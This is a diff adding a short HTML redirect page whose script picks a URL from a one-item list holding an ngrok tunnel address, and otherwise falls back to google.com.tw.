@@ -1,0 +1,23 @@
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>redirect</title>
+  </head>
+
+  <body>
+    <script>
+      var urls = [
+        "https://7f82-2401-e180-8810-d71e-f3ee-5e22-b8f8-ccb5.ngrok-free.app/",
+      ];
+      //下面的不要碰
+      var min = 0;
+      var max = urls.length - 1;
+      if (max == 0) {
+        window.location.href = "https://www.google.com.tw";
+      } else {
+        var random = Math.floor(Math.random() * (max - min + 1)) + min;
+        window.location.href = urls[random];
+      }
+    </script>
+  </body>
+</html>
